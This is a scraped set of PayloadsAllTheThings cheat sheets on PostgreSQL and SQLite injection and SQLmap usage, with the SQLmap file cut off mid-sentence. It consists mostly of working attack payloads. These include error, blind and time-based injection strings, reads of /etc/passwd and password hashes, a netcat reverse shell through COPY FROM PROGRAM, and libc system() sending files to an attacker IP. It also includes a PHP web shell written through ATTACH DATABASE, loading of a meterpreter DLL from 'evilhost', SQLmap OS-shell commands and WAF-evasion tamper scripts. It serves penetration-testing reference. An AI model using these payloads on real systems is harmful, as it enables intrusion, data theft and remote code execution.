{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/PostgreSQL Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md", "content": "# PostgreSQL Injection\n\n> PostgreSQL SQL injection refers to a type of security vulnerability where attackers exploit improperly sanitized user input to execute unauthorized SQL commands within a PostgreSQL database.\n\n## Summary\n\n* [PostgreSQL Comments](#postgresql-comments)\n* [PostgreSQL Enumeration](#postgresql-enumeration)\n* [PostgreSQL Methodology](#postgresql-methodology)\n* [PostgreSQL Error Based](#postgresql-error-based)\n    * [PostgreSQL XML Helpers](#postgresql-xml-helpers)\n* [PostgreSQL Blind](#postgresql-blind)\n    * [PostgreSQL Blind With Substring Equivalent](#postgresql-blind-with-substring-equivalent)\n* [PostgreSQL Time Based](#postgresql-time-based)\n* [PostgreSQL Out of Band](#postgresql-out-of-band)\n* [PostgreSQL Stacked Query](#postgresql-stacked-query)\n* [PostgreSQL File Manipulation](#postgresql-file-manipulation)\n    * [PostgreSQL File Read](#postgresql-file-read)\n    * [PostgreSQL File Write](#postgresql-file-write)\n* [PostgreSQL Command Execution](#postgresql-command-execution)\n    * [Using COPY TO/FROM PROGRAM](#using-copy-tofrom-program)\n    * [Using libc.so.6](#using-libcso6)\n* [PostgreSQL WAF Bypass](#postgresql-waf-bypass)\n    * [Alternative to Quotes](#alternative-to-quotes)\n* [PostgreSQL Privileges](#postgresql-privileges)\n    * [PostgreSQL List Privileges](#postgresql-list-privileges)\n    * [PostgreSQL Superuser Role](#postgresql-superuser-role)\n* [References](#references)\n\n## PostgreSQL Comments\n\n| Type                | Comment |\n| ------------------- | ------- |\n| Single-Line Comment | `--`    |\n| Multi-Line Comment  | `/**/`  |\n\n## PostgreSQL Enumeration\n\n| Description            | SQL Query                               |\n| ---------------------- | --------------------------------------- |\n| DBMS version           | `SELECT version()`                      |\n| Database Name          | `SELECT CURRENT_DATABASE()`             |\n| Database Schema        | `SELECT CURRENT_SCHEMA()`               |\n| List PostgreSQL Users  | `SELECT usename FROM pg_user`           |\n| List Password Hashes   | `SELECT usename, passwd FROM pg_shadow` |\n| List DB Administrators | `SELECT usename FROM pg_user WHERE usesuper IS TRUE` |\n| Current User           | `SELECT user;`                          |\n| Current User           | `SELECT current_user;`                  |\n| Current User           | `SELECT session_user;`                  |\n| Current User           | `SELECT usename FROM pg_user;`          |\n| Current User           | `SELECT getpgusername();`               |\n\n## PostgreSQL Methodology\n\n| Description            | SQL Query                                    |\n| ---------------------- | -------------------------------------------- |\n| List Schemas           | `SELECT DISTINCT(schemaname) FROM pg_tables` |\n| List Databases         | `SELECT datname FROM pg_database`            |\n| List Tables            | `SELECT table_name FROM information_schema.tables` |\n| List Tables            | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'` |\n| List Tables            | `SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>'` |\n| List Columns           | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'` |\n\n## PostgreSQL Error Based\n\n| Name         | Payload         |\n| ------------ | --------------- |\n| CAST | `AND 1337=CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC) -- -` |\n| CAST | `AND (CAST('~'\\|\\|(SELECT version())::text\\|\\|'~' AS NUMERIC)) -- -` |\n| CAST | `AND CAST((SELECT version()) AS INT)=1337 -- -` |\n| CAST | `AND (SELECT version())::int=1 -- -` |\n\n```sql\nCAST(chr(126)||VERSION()||chr(126) AS NUMERIC)\nCAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--\nCAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)\n```\n\n```sql\n' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1\n' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1\n' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1\n```\n\n### PostgreSQL XML Helpers\n\n```sql\nSELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row\n```\n\nThe `query_to_xml` above returns all the results of the specified query as a single result. Chain this with the [PostgreSQL Error Based](#postgresql-error-based) technique to exfiltrate data without having to worry about `LIMIT`ing your query to one result.\n\n```sql\nSELECT database_to_xml(true,true,''); -- dump the current database to XML\nSELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema\n```\n\nNote, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.\n\n## PostgreSQL Blind\n\n### PostgreSQL Blind With Substring Equivalent\n\n| Function    | Example                                         |\n| ----------- | ----------------------------------------------- |\n| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`           |\n| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |\n| `SUBSTRING` | `SUBSTRING('foobar' FROM <START> FOR <LENGTH>)` |\n\nExamples:\n\n```sql\n' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE\n' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE\n```\n\n## PostgreSQL Time Based\n\n### Identify Time Based\n\n```sql\nselect 1 from pg_sleep(5)\n;(select 1 from pg_sleep(5))\n||(select 1 from pg_sleep(5))\n```\n\n### Database Dump Time Based\n\n```sql\nselect case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1\n```\n\n### Table Dump Time Based\n\n```sql\nselect case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1\n```\n\n### Columns Dump Time Based\n\n```sql\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1\nselect case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1\n```\n\n```sql\nAND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'\nAND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))\nAND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))\n```\n\n## PostgreSQL Out of Band\n\nOut-of-band SQL injections in PostgreSQL relies on the use of functions that can interact with the file system or network, such as `COPY`, `lo_export`, or functions from extensions that can perform network actions. The idea is to exploit the database to send data elsewhere, which the attacker can monitor and intercept.\n\n```sql\ndeclare c text;\ndeclare p text;\nbegin\nSELECT into p (SELECT YOUR-QUERY-HERE);\nc := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';\nexecute c;\nEND;\n$$ language plpgsql security definer;\nSELECT f();\n```\n\n## PostgreSQL Stacked Query\n\nUse a semi-colon \"`;`\" to add another query\n\n```sql\nSELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--\n```\n\n## PostgreSQL File Manipulation\n\n### PostgreSQL File Read\n\nNOTE: Earlier versions of Postgres did not accept absolute paths in `pg_read_file` or `pg_ls_dir`. Newer versions (as of [0fdc8495bff02684142a44ab3bc5b18a8ca1863a](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) commit) will allow reading any file/filepath for super users or users in the `default_role_read_server_files` group.\n\n* Using `pg_read_file`, `pg_ls_dir`\n\n    ```sql\n    select pg_ls_dir('./');\n    select pg_read_file('PG_VERSION', 0, 200);\n    ```\n\n* Using `COPY`\n\n    ```sql\n    CREATE TABLE temp(t TEXT);\n    COPY temp FROM '/etc/passwd';\n    SELECT * FROM temp limit 1 offset 0;\n    ```\n\n* Using `lo_import`\n\n    ```sql\n    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID\n    SELECT lo_get(16420); -- use the OID returned from the above\n    SELECT * from pg_largeobject; -- or just get all the large objects and their data\n    ```\n\n### PostgreSQL File Write\n\n* Using `COPY`\n\n    ```sql\n    CREATE TABLE nc (t TEXT);\n    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');\n    SELECT * FROM nc;\n    COPY nc(t) TO '/tmp/nc.sh';\n    ```\n\n* Using `COPY` (one-line)\n\n    ```sql\n    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';\n    ```\n\n* Using `lo_from_bytea`, `lo_put` and `lo_export`\n\n    ```sql\n    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data\n    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20\n    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport\n    ```\n\n## PostgreSQL Command Execution\n\n### Using COPY TO/FROM PROGRAM\n\nInstallations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.\n\n```sql\nCOPY (SELECT '') to PROGRAM 'nslookup BURP-COLLABORATOR-SUBDOMAIN'\n```\n\n```sql\nCREATE TABLE shell(output text);\nCOPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';\n```\n\n### Using libc.so.6\n\n```sql\nCREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;\nSELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');\n```\n\n## PostgreSQL WAF Bypass\n\n### Alternative to Quotes\n\n| Payload            | Technique |\n| ------------------ | --------- |\n| `SELECT CHR(65)\\|\\|CHR(66)\\|\\|CHR(67);` | String from `CHR()` |\n| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |\n\n## PostgreSQL Privileges\n\n### PostgreSQL List Privileges\n\nRetrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.\n\n```sql\nSELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');\n```\n\n### PostgreSQL Superuser Role\n\n```sql\nSHOW is_superuser; \nSELECT current_setting('is_superuser');\nSELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;\n```\n\n## References\n\n* [A Penetration Tester's Guide to PostgreSQL - David Hayter - July 22, 2017](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)\n* [Advanced PostgreSQL SQL Injection and Filter Bypass Techniques - Leon Juranic - June 17, 2009](https://www.infigo.hr/files/INFIGO-TD-2009-04_PostgreSQL_injection_ENG.pdf)\n* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - GreenWolf - March 20, 2019](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)\n* [Postgres SQL Injection Cheat Sheet - @pentestmonkey - August 23, 2011](http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)\n* [PostgreSQL 9.x Remote Command Execution - dionach - October 26, 2017](https://www.dionach.com/blog/postgresql-9-x-remote-command-execution/)\n* [SQL Injection /webApp/oma_conf ctx parameter - Sergey Bobrov (bobrov) - December 8, 2016](https://hackerone.com/reports/181803)\n* [SQL Injection and Postgres - An Adventure to Eventual RCE - Denis Andzakovic - May 5, 2020](https://pulsesecurity.co.nz/articles/postgres-sqli)\n", "timestamp": "2025-10-21T13:30:18.310243"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/SQLite Injection.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md", "content": "# SQLite Injection\n\n> SQLite Injection  is a type of security vulnerability that occurs when an attacker can insert or \"inject\" malicious SQL code into SQL queries executed by an SQLite database. This vulnerability arises when user inputs are integrated into SQL statements without proper sanitization or parameterization, allowing attackers to manipulate the query logic. Such injections can lead to unauthorized data access, data manipulation, and other severe security issues.\n\n## Summary\n\n* [SQLite Comments](#sqlite-comments)\n* [SQLite Enumeration](#sqlite-enumeration)\n* [SQLite String](#sqlite-string)\n    * [SQLite String Methodology](#sqlite-string-methodology)\n* [SQLite Blind](#sqlite-blind)\n    * [SQLite Blind Methodology](#sqlite-blind-methodology)\n    * [SQLite Blind With Substring Equivalent](#sqlite-blind-with-substring-equivalent)\n* [SQlite Error Based](#sqlite-error-based)\n* [SQlite Time Based](#sqlite-time-based)\n* [SQlite Remote Code Execution](#sqlite-remote-code-execution)\n    * [Attach Database](#attach-database)\n    * [Load_extension](#load_extension)\n* [SQLite File Manipulation](#sqlite-file-manipulation)\n    * [SQLite Read File](#sqlite-read-file)\n    * [SQLite Write File](#sqlite-write-file)\n* [References](#references)\n\n## SQLite Comments\n\n| Description         | Comment |\n| ------------------- | ------- |\n| Single-Line Comment | `--`    |\n| Multi-Line Comment  | `/**/`  |\n\n## SQLite Enumeration\n\n| Description   | SQL Query |\n| ------------- | ----------------------------------------- |\n| DBMS version  | `select sqlite_version();`                |\n\n## SQLite String\n\n### SQLite String Methodology\n\n| Description             | SQL Query                                 |\n| ----------------------- | ----------------------------------------- |\n| Extract Database Structure                           | `SELECT sql FROM sqlite_schema` |\n| Extract Database Structure (sqlite_version > 3.33.0) | `SELECT sql FROM sqlite_master` |\n| Extract Table Name  | `SELECT tbl_name FROM sqlite_master WHERE type='table'` |\n| Extract Table Name  | `SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'` |\n| Extract Column Name | `SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name'` |\n| Extract Column Name | `SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');` |\n| Extract Column Name | `SELECT MAX(sql) FROM sqlite_master WHERE tbl_name='<TABLE_NAME>'` |\n| Extract Column Name | `SELECT name FROM PRAGMA_TABLE_INFO('<TABLE_NAME>')` |\n\n## SQLite Blind\n\n### SQLite Blind Methodology\n\n| Description             | SQL Query                                 |\n| ----------------------- | ----------------------------------------- |\n| Count Number Of Tables  | `AND (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < number_of_table` |\n| Enumerating Table Name  | `AND (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0)=table_name_length_number` |\n| Extract Info            | `AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('some_char')` |\n| Extract Info (order by) | `CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) = HEX('some_char') THEN <order_element_1> ELSE <order_element_2> END` |\n\n### SQLite Blind With Substring Equivalent\n\n| Function    | Example                                   |\n| ----------- | ----------------------------------------- |\n| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`  |\n| `SUBSTR`    | `SUBSTR('foobar', <START>, <LENGTH>)`     |\n\n## SQlite Error Based\n\n```sql\nAND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END\n```\n\n## SQlite Time Based\n\n```sql\nAND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))\nAND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\n```\n\n## SQLite Remote Code Execution\n\n### Attach Database\n\n```sql\nATTACH DATABASE '/var/www/lol.php' AS lol;\nCREATE TABLE lol.pwn (dataz text);\nINSERT INTO lol.pwn (dataz) VALUES (\"<?php system($_GET['cmd']); ?>\");--\n```\n\n### Load_extension\n\n:warning: This component is disabled by default.\n\n```sql\nUNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');--\n```\n\n## SQLite File Manipulation\n\n### SQLite Read File\n\nSQLite does not support file I/O operations by default.\n\n### SQLite Write File\n\n```sql\nSELECT writefile('/path/to/file', column_name) FROM table_name\n```\n\n## References\n\n* [Injecting SQLite database based application - Manish Kishan Tanwar - February 14, 2017](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)\n* [SQLite Error Based Injection for Enumeration - Rio Asmara Suryadi - February 6, 2021](https://rioasmara.com/2021/02/06/sqlite-error-based-injection-for-enumeration/)\n* [SQLite3 Injection Cheat sheet - Nickosaurus Hax - May 31, 2012](https://web.archive.org/web/20131208191957/https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)\n", "timestamp": "2025-10-21T13:30:18.539828"}
{"source": "github", "repo": "swisskyrepo/PayloadsAllTheThings", "file": "SQL Injection/SQLmap.md", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLmap.md", "content": "# SQLmap\n\n> SQLmap is a powerful tool that automates the detection and exploitation of SQL injection vulnerabilities, saving time and effort compared to manual testing. It supports a wide range of databases and injection techniques, making it versatile and effective in various scenarios.\n> Additionally, SQLmap can retrieve data, manipulate databases, and even execute commands, providing a robust set of features for penetration testers and security analysts.\n> Reinventing the wheel isn't ideal because SQLmap has been rigorously developed, tested, and improved by experts. Using a reliable, community-supported tool means you benefit from established best practices and avoid the high risk of missing vulnerabilities or introducing errors in custom code.\n> However you should always know how SQLmap is working, and be able to replicate it manually if necessary.\n\n## Summary\n\n* [Basic Arguments For SQLmap](#basic-arguments-for-sqlmap)\n* [Load A Request File](#load-a-request-file)\n* [Custom Injection Point](#custom-injection-point)\n* [Second Order Injection](#second-order-injection)\n* [Getting A Shell](#getting-a-shell)\n* [Crawl And Auto-Exploit](#crawl-and-auto-exploit)\n* [Proxy Configuration For SQLmap](#proxy-configuration-for-sqlmap)\n* [Injection Tampering](#injection-tampering)\n    * [Suffix And Prefix](#suffix-and-prefix)\n    * [Default Tamper Scripts](#default-tamper-scripts)\n    * [Custom Tamper Scripts](#custom-tamper-scripts)\n    * [Custom SQL Payload](#custom-sql-payload)\n    * [Evaluate Python Code](#evaluate-python-code)\n    * [Preprocess And Postprocess Scripts](#preprocess-and-postprocess-scripts)\n* [Reduce Requests Number](#reduce-requests-number)\n* [SQLmap Without SQL Injection](#sqlmap-without-sql-injection)\n* [References](#references)\n\n## Basic Arguments For SQLmap\n\n```powershell\nsqlmap --url=\"<url>\" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs\n```\n\n## Load A Request File\n\nA request file in SQLmap is a saved HTTP request that SQLmap reads and uses to perform SQL injection testing. This file allows you to provide a complete and custom HTTP request, which SQLmap can use to target more complex applications.\n\n```powershell\nsqlmap -r request.txt\n```\n\n## Custom Injection Point\n\nA custom injection point in SQLmap allows you to specify exactly where and how SQLmap should attempt to inject payloads into a request. This is useful when dealing with more complex or non-standard injection scenarios that SQLmap may not detect automatically.\n\nBy defining a custom injection point with the wildcard character '`*`' , you have finer control over the testing process, ensuring SQLmap targets specific parts of the request you suspect to be vulnerable.\n\n```powershell\nsqlmap -u \"http://example.com\" --data \"username=admin&password=pass\"  --headers=\"x-forwarded-for:127.0.0.1*\"\n```\n\n## Second Order Injection\n\nA second-order SQL injection occurs when malicious SQL code injected into an application is not executed immediately but is instead stored in the database and later used in another SQL query.\n\n```powershell\nsqlmap -r /tmp/r.txt --dbms MySQL --second-order \"http://targetapp/wishlist\" -v 3\nsqlmap -r 1.txt -dbms MySQL -second-order \"http://<IP/domain>/joomla/administrator/index.php\" -D \"joomla\" -dbs\n```\n\n## Getting A Shell\n\n* SQL Shell:\n\n    ```ps1\n    sqlmap -u \"http://example.com/?id=1\"  -p id --sql-shell\n    ```\n\n* OS Shell:\n\n    ```ps1\n    sqlmap -u \"http://example.com/?id=1\"  -p id --os-shell\n    ```\n\n* Meterpreter:\n\n    ```ps1\n    sqlmap -u \"http://example.com/?id=1\"  -p id --os-pwn\n    ```\n\n* SSH Shell:\n\n    ```ps1\n    sqlmap -u \"http://example.com/?id=1\" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/\n    ```\n\n## Crawl And Auto-Exploit\n\nThis method is not advisable for penetration testing; it should only be used in controlled environments or challenges. It will crawl the entire website and automatically submit forms, which may lead to unintended requests being sent to sensitive features like \"delete\" or \"destroy\" endpoints.\n\n```powershell\nsqlmap -u \"http://example.com/\" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3\n```\n\n* `--batch` = Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers\n* `--crawl` = How deep you want to crawl a site\n* `--forms` = Parse and test forms\n\n## Proxy Configuration For SQLmap\n\nTo run SQLmap with a proxy, you can use the `--proxy` option followed by the proxy URL. SQLmap supports various types of proxies such as HTTP, HTTPS, SOCKS4, and SOCKS5.\n\n```powershell\nsqlmap -u \"http://www.target.com\" --proxy=\"http://127.0.0.1:8080\"\nsqlmap -u \"http://www.target.com/page.php?id=1\" --proxy=\"http://127.0.0.1:8080\" --proxy-cred=\"user:pass\"\n```\n\n* HTTP Proxy:\n\n    ```ps1\n    --proxy=\"http://[username]:[password]@[proxy_ip]:[proxy_port]\"\n    --proxy=\"http://user:pass@127.0.0.1:8080\"\n    ```\n\n* SOCKS Proxy:\n\n    ```ps1\n    --proxy=\"socks4://[username]:[password]@[proxy_ip]:[proxy_port]\"\n    --proxy=\"socks4://user:pass@127.0.0.1:1080\"\n    ```\n\n* SOCKS5 Proxy:\n\n    ```ps1\n    --proxy=\"socks5://[username]:[password]@[proxy_ip]:[proxy_port]\"\n    --proxy=\"socks5://user:pass@127.0.0.1:1080\"\n    ```\n\n## Injection Tampering\n\nIn SQLmap, tampering can help you adjust the injection in specific ways required to bypass web application firewalls (WAFs) or custom sanitization mechanisms. SQLmap provides various options and techniques to tamper with the payloads being used for SQL injection.\n\n### Suffix And Prefix\n\nThe `--suffix` and `--prefix` options allow you to specify additional strings that should be appended or prepended to the payloads generated by SQLMap. These options can be useful when the target application requires specific formatting or when you need to bypass certain filters or protections.\n\n```powershell\nsqlmap -u \"http://example.com/?id=1\"  -p id --suffix=\"-- \"\n```\n\n* `--suffix=SUFFIX`: The `--suffix` option appends a specified string to the end of each payload generated by SQLMap.\n* `--prefix=PREFIX`: The `--prefix` option prepends a specified string to the beginning of each payload generated by SQLMap.\n\n### Default Tamper Scripts\n\nA tamper script  is a script that modifies the SQL injection payloads to evade detection by WAFs or other security mechanisms. SQLmap comes with a variety of pre-built tamper scripts that can be used to automatically adjust payloads\n\n```powershell\nsqlmap -u \"http://targetwebsite.com/vulnerablepage.php?id=1\" --tamper=<tamper-script-name>\n```\n\nBelow is a table highlighting some of the most commonly used tamper scripts:\n\n| Tamper | Description |\n| --- | --- |\n|0x2char.py | Replaces each (MySQL) 0xHEX encoded string with equivalent CONCAT(CHAR(),…) counterpart |\n|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |\n|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|\n|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |\n|base64encode.py | Base64 all characters in a given payload  |\n|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |\n|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |\n|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |\n|charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %53%45%4C%45%43%54) |\n|charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054) |\n|charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -> \\u0053\\u0045\\u004C\\u0045\\u0043\\u0054) |\n|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|\n|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|\n|commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -> /**/() |\n|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|\n|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |\n|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |\n|equaltolike.py | Replaces all occurrences of operator equal ('=') with operator 'LIKE'  |\n|escapequotes.py | Slash escape quotes (' and \") |\n|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |\n|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |\n|htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ' -> &#39;) |\n|ifnull2casewhenisnull.py | Replaces instances like 'IFNULL(A, B)' with 'CASE WHEN ISNULL(A) THEN (B) ELSE (A) END' counterpart|\n|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|\n|informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) \"information_schema\" identifier |\n|least.py | Replaces greater than operator ('>') with 'LEAST' counterpart |\n|lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -> select) |\n|modsecurityversioned.py | Embraces complete query with versioned comment |\n|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |\n|multiplespaces.py | Adds multiple spaces around SQL keywords |\n|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(\"SELECT\", \"\")) filters|\n|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |\n|overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -> %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |\n|percentage.py | Adds a percentage sign ('%') infront of each character  |\n|plus2concat.py | Replaces plus operator ('+') with (MsSQL) function CONCAT() counterpart |\n|plus2fnconcat.py | Replaces plus operator ('+') with (MsSQL) ODBC function {fn CONCAT()} counterpart |\n|randomcase.py | Replaces each keyword character with random case value |\n|randomcomments.py | Add random comments to SQL keywords|\n|securesphere.py | Appends special crafted string |\n|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |\n|space2comment.py | Replaces space character (' ') with comments |\n|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\\n') |\n|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') |\n|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\\n') |\n|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |\n|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\\n') |\n|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |\n|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\\n') |\n|space2plus.py |  Replaces space character (' ') with plus ('+')  |\n|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |\n|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and \\|\\|) |\n|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |\n|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |\n|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|\n|varnish.py | Append a HTTP header 'X-originating-IP' |\n|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |\n|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |\n|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For' |\n\n### Custom Tamper Scripts\n\nWhen creating a custom tamper script, there are a few things to keep in mind. The script architecture contains these mandatory variables and functions:\n\n* `__priority__`: Defines the order in which tamper scripts are applied.  This sets how early or late SQLmap should apply your tamper script in the tamper pipeline. Normal priority is 0 and the highest is 100.\n* `dependencies()`: This function gets called before the tamper script is used.\n* `tamper(payload)`: The main function that modifies the payload.\n\nThe following code is an example of a tamper script that replace instances like '`LIMIT M, N`' with '`LIMIT N OFFSET M`' counterpart:\n\n```py\nimport os\nimport re\n\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import PRIORITY\n\n__priority__ = PRIORITY.HIGH\n\ndef dependencies():\n    singleTimeWarnMessage(\"tamper script '%s' is only meant to be run against %s\" % (os.path.basename(__file__).split(\".\")[0], DBMS.MYSQL))\n\ndef tamper(payload, **kwargs):\n    retVal = payload\n\n    match = re.search(r\"(?i)LIMIT\\s*(\\d+),\\s*(\\d+)\", payload or \"\")\n    if match:\n        retVal = retVal.replace(match.group(0), \"LIMIT %s OFFSET %s\" % (match.group(2), match.group(1)))\n\n    return retVal\n```\n\n* Save it as something like: `mytamper.py`\n* Place it inside SQLmap's `tamper/` directory, typically:\n\n    ```ps1\n    /usr/share/sqlmap/tamper/\n    ```\n\n* Use it with SQLmap\n\n    ```ps1\n    sqlmap -u \"http://target.com/vuln.php?id=1\" --tamper=mytamper\n    ```\n\n### Custom SQL Payload\n\nThe `--sql-query` option in SQLmap is used to manually run your own SQL query on a vulnerable database after SQLmap has confirmed the injection and gathered necessary 